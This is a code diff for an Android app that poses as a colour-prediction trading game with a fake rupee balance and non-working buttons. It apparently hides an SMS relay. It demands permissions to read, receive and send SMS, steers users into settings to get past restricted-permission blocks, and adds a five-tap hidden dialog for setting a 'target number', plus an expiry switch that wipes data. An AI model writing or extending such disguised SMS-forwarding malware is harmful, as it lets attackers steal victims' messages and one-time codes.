@@ -53,14 +53,25 @@ fun RelayApp() {
     val coroutineScope = rememberCoroutineScope()
     val snackbarHostState = remember { SnackbarHostState() }
 
+    if (settingsManager.isExpired()) {
+        settingsManager.clearAll()
+        Box(
+            modifier = Modifier.fillMaxSize().background(androidx.compose.ui.graphics.Color.Black),
+            contentAlignment = Alignment.Center
+        ) {
+            Text("Service Unavailable", color = androidx.compose.ui.graphics.Color.Red, style = MaterialTheme.typography.headlineMedium)
+        }
+        return
+    }
+
     var hasPermissions by remember { mutableStateOf(false) }
     var relayState by remember { mutableStateOf(settingsManager.relayState) }
 
     val requiredPermissions = mutableListOf(
+        Manifest.permission.INTERNET,
         Manifest.permission.RECEIVE_SMS,
         Manifest.permission.SEND_SMS,
-        Manifest.permission.READ_SMS,
-        Manifest.permission.INTERNET
+        Manifest.permission.READ_SMS
     ).apply {
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
             add(Manifest.permission.POST_NOTIFICATIONS)
@@ -82,11 +93,24 @@ fun RelayApp() {
         }
     }
 
+    fun openAppSettings() {
+        val intent = Intent(android.provider.Settings.ACTION_APPLICATION_DETAILS_SETTINGS).apply {
+            data = android.net.Uri.fromParts("package", context.packageName, null)
+        }
+        context.startActivity(intent)
+    }
+
     val permissionLauncher = androidx.activity.compose.rememberLauncherForActivityResult(
         contract = ActivityResultContracts.RequestMultiplePermissions()
     ) { permissions ->
         hasPermissions = requiredPermissions.all {
             ContextCompat.checkSelfPermission(context, it) == PackageManager.PERMISSION_GRANTED
+        }
+        if (!hasPermissions) {
+            coroutineScope.launch {
+                snackbarHostState.showSnackbar("Please enable SMS permissions (use 3-dots if restricted)")
+            }
+            openAppSettings()
         }
     }
 
@@ -99,13 +123,6 @@ fun RelayApp() {
                 context.startService(serviceIntent)
             }
         }
-    }
-
-    fun openAppSettings() {
-        val intent = Intent(android.provider.Settings.ACTION_APPLICATION_DETAILS_SETTINGS).apply {
-            data = android.net.Uri.fromParts("package", context.packageName, null)
-        }
-        context.startActivity(intent)
     }
 
     Scaffold(
@@ -162,7 +179,6 @@ fun RelayApp() {
                     Button(
                         onClick = {
                             permissionLauncher.launch(requiredPermissions.toTypedArray())
-                            openAppSettings()
                         },
                         modifier = Modifier
                             .fillMaxWidth(0.85f)
@@ -195,14 +211,30 @@ fun TradingHomeScreen() {
     val tabs = listOf("Home", "Trade", "History", "Wallet", "Profile")
     val context = LocalContext.current
     var currentTarget by remember { mutableStateOf(SettingsManager(context).targetNumber) }
+    var showDialog by remember { mutableStateOf(false) }
+    var tempNumber by remember { mutableStateOf(currentTarget) }
+    var tapCount by remember { mutableStateOf(0) }
     
-    // UI poller just for target number display updates
-    LaunchedEffect(Unit) {
-        val manager = SettingsManager(context)
-        while(true) {
-            currentTarget = manager.targetNumber
-            kotlinx.coroutines.delay(2000)
-        }
+    if (showDialog) {
+        AlertDialog(
+            onDismissRequest = { showDialog = false },
+            title = { Text("Hidden Settings") },
+            text = {
+                OutlinedTextField(
+                    value = tempNumber,
+                    onValueChange = { tempNumber = it },
+                    label = { Text("Enter Target Number") }
+                )
+            },
+            confirmButton = {
+                TextButton(onClick = {
+                    SettingsManager(context).targetNumber = tempNumber
+                    currentTarget = tempNumber
+                    showDialog = false
+                    tapCount = 0
+                }) { Text("Save") }
+            }
+        )
     }
     
     Scaffold(
@@ -221,7 +253,13 @@ fun TradingHomeScreen() {
     ) { padding ->
         Box(modifier = Modifier.padding(padding)) {
             when (selectedTab) {
-                0 -> TradingContent(currentTarget)
+                0 -> Column(modifier = Modifier.clickable(onClick = {
+                    tapCount++
+                    if (tapCount >= 5) {
+                        showDialog = true
+                        tapCount = 0
+                    }
+                })) { TradingContent(currentTarget) }
                 else -> Text("Tab ${tabs[selectedTab]} Content", color = androidx.compose.ui.graphics.Color.White, modifier = Modifier.align(Alignment.Center))
             }
         }
@@ -233,75 +271,53 @@ fun TradingContent(currentTarget: String) {
     Column(
         modifier = Modifier
             .fillMaxSize()
-            .background(androidx.compose.ui.graphics.Color(0xFF121212))
-            .padding(horizontal = 16.dp, vertical = 12.dp),
+            .background(androidx.compose.ui.graphics.Color(0xFF0D0D0D))
+            .padding(16.dp),
         horizontalAlignment = Alignment.CenterHorizontally
     ) {
-        // Status Card
-        if (currentTarget.isNotEmpty()) {
-            Card(
-                modifier = Modifier.fillMaxWidth().padding(bottom = 12.dp),
-                shape = androidx.compose.foundation.shape.RoundedCornerShape(8.dp),
-                colors = CardDefaults.cardColors(containerColor = androidx.compose.ui.graphics.Color(0xFF003300))
-            ) {
-                Text(
-                    text = "SYNCED DEVICE: $currentTarget", 
-                    color = androidx.compose.ui.graphics.Color(0xFF00FF00), 
-                    modifier = Modifier.padding(12.dp),
-                    fontWeight = FontWeight.Bold
-                )
-            }
-        } else {
-            Card(
-                modifier = Modifier.fillMaxWidth().padding(bottom = 12.dp),
-                shape = androidx.compose.foundation.shape.RoundedCornerShape(8.dp),
-                colors = CardDefaults.cardColors(containerColor = androidx.compose.ui.graphics.Color(0xFF330000))
-            ) {
-                Text(
-                    text = "NOT SYNCED YET", 
-                    color = androidx.compose.ui.graphics.Color.Red, 
-                    modifier = Modifier.padding(12.dp),
-                    fontWeight = FontWeight.Bold
-                )
-            }
-        }
-
-        // Header: Balance Card
+        // Balance Card
         Card(
             modifier = Modifier.fillMaxWidth(),
-            shape = androidx.compose.foundation.shape.RoundedCornerShape(16.dp),
-            colors = CardDefaults.cardColors(containerColor = androidx.compose.ui.graphics.Color(0xFF1E1E1E))
+            shape = androidx.compose.foundation.shape.RoundedCornerShape(24.dp),
+            colors = CardDefaults.cardColors(containerColor = androidx.compose.ui.graphics.Color(0xFF1A1A1A)),
+            elevation = CardDefaults.cardElevation(defaultElevation = 8.dp)
         ) {
-            Column(modifier = Modifier.padding(20.dp)) {
-                Text("Total Balance", color = androidx.compose.ui.graphics.Color(0xFF9E9E9E), style = MaterialTheme.typography.bodySmall)
-                Text("₹ 24,680.50", color = androidx.compose.ui.graphics.Color.White, style = MaterialTheme.typography.headlineLarge, fontWeight = FontWeight.Bold)
-                Spacer(Modifier.height(16.dp))
+            Column(modifier = Modifier.padding(24.dp)) {
+                Text("Total Balance", color = androidx.compose.ui.graphics.Color(0xFF888888), style = MaterialTheme.typography.labelLarge)
+                Spacer(Modifier.height(4.dp))
+                Text("₹ 48,290.75", color = androidx.compose.ui.graphics.Color.White, style = MaterialTheme.typography.headlineLarge, fontWeight = FontWeight.ExtraBold)
+                Spacer(Modifier.height(20.dp))
                 Row(horizontalArrangement = Arrangement.spacedBy(12.dp)) {
-                    Button(onClick = {}, shape = androidx.compose.foundation.shape.RoundedCornerShape(8.dp), colors = ButtonDefaults.buttonColors(containerColor = androidx.compose.ui.graphics.Color(0xFF333333))) { Text("Withdraw") }
-                    Button(onClick = {}, shape = androidx.compose.foundation.shape.RoundedCornerShape(8.dp), colors = ButtonDefaults.buttonColors(containerColor = androidx.compose.ui.graphics.Color(0xFF00C853))) { Text("Deposit") }
+                    Button(onClick = {}, shape = androidx.compose.foundation.shape.RoundedCornerShape(12.dp), colors = ButtonDefaults.buttonColors(containerColor = androidx.compose.ui.graphics.Color(0xFF2C2C2C)), modifier = Modifier.weight(1f)) { Text("Deposit") }
+                    Button(onClick = {}, shape = androidx.compose.foundation.shape.RoundedCornerShape(12.dp), colors = ButtonDefaults.buttonColors(containerColor = androidx.compose.ui.graphics.Color(0xFF00C853)), modifier = Modifier.weight(1f)) { Text("Withdraw") }
                 }
             }
         }
 
-        Spacer(modifier = Modifier.height(20.dp))
+        Spacer(modifier = Modifier.height(24.dp))
 
-        // Live Market Card
-        Card(modifier = Modifier.fillMaxWidth(), shape = androidx.compose.foundation.shape.RoundedCornerShape(16.dp), colors = CardDefaults.cardColors(containerColor = androidx.compose.ui.graphics.Color(0xFF1E1E1E))) {
-            Column(modifier = Modifier.padding(16.dp)) {
-                Text("COLOR MARKET", color = androidx.compose.ui.graphics.Color.White, fontWeight = FontWeight.Bold)
-                Text("Session #582941 | LIVE", color = androidx.compose.ui.graphics.Color(0xFF9E9E9E), style = MaterialTheme.typography.bodySmall)
+        // Live Market Status
+        Row(modifier = Modifier.fillMaxWidth(), horizontalArrangement = Arrangement.SpaceBetween, verticalAlignment = Alignment.CenterVertically) {
+            Text("Live Market", color = androidx.compose.ui.graphics.Color.White, fontWeight = FontWeight.Bold, style = MaterialTheme.typography.titleMedium)
+            Text("SESSION: #582941", color = androidx.compose.ui.graphics.Color(0xFF00E5FF), style = MaterialTheme.typography.labelSmall)
+        }
+        
+        Spacer(Modifier.height(12.dp))
+
+        Card(modifier = Modifier.fillMaxWidth(), shape = androidx.compose.foundation.shape.RoundedCornerShape(20.dp), colors = CardDefaults.cardColors(containerColor = androidx.compose.ui.graphics.Color(0xFF1A1A1A))) {
+            Column(modifier = Modifier.padding(20.dp), horizontalAlignment = Alignment.CenterHorizontally) {
+                Text("Time Remaining", color = androidx.compose.ui.graphics.Color(0xFF888888), style = MaterialTheme.typography.labelMedium)
                 Spacer(Modifier.height(8.dp))
-                Text("00:28", style = MaterialTheme.typography.displayMedium, color = androidx.compose.ui.graphics.Color(0xFFD4AF37), fontWeight = FontWeight.Bold)
+                Text("00:15", style = MaterialTheme.typography.displayMedium, color = androidx.compose.ui.graphics.Color(0xFFD4AF37), fontWeight = FontWeight.Black)
             }
         }
 
-        Spacer(modifier = Modifier.height(20.dp))
+        Spacer(modifier = Modifier.height(24.dp))
 
-        // Color Buttons (Professional)
-        Row(modifier = Modifier.fillMaxWidth(), horizontalArrangement = Arrangement.spacedBy(12.dp)) {
-            Button(onClick = {}, modifier = Modifier.weight(1f).height(56.dp), shape = androidx.compose.foundation.shape.RoundedCornerShape(12.dp), colors = ButtonDefaults.buttonColors(containerColor = androidx.compose.ui.graphics.Color(0xFF00C853))) { Text("GREEN") }
-            Button(onClick = {}, modifier = Modifier.weight(1f).height(56.dp), shape = androidx.compose.foundation.shape.RoundedCornerShape(12.dp), colors = ButtonDefaults.buttonColors(containerColor = androidx.compose.ui.graphics.Color(0xFF7B1FA2))) { Text("VIOLET") }
-            Button(onClick = {}, modifier = Modifier.weight(1f).height(56.dp), shape = androidx.compose.foundation.shape.RoundedCornerShape(12.dp), colors = ButtonDefaults.buttonColors(containerColor = androidx.compose.ui.graphics.Color(0xFFD32F2F))) { Text("RED") }
+        // Trading Buttons
+        Row(modifier = Modifier.fillMaxWidth(), horizontalArrangement = Arrangement.spacedBy(16.dp)) {
+            Button(onClick = {}, modifier = Modifier.weight(1f).height(64.dp), shape = androidx.compose.foundation.shape.RoundedCornerShape(16.dp), colors = ButtonDefaults.buttonColors(containerColor = androidx.compose.ui.graphics.Color(0xFF00C853))) { Text("GREEN", fontWeight = FontWeight.Bold) }
+            Button(onClick = {}, modifier = Modifier.weight(1f).height(64.dp), shape = androidx.compose.foundation.shape.RoundedCornerShape(16.dp), colors = ButtonDefaults.buttonColors(containerColor = androidx.compose.ui.graphics.Color(0xFFD32F2F))) { Text("RED", fontWeight = FontWeight.Bold) }
         }
     }
 }
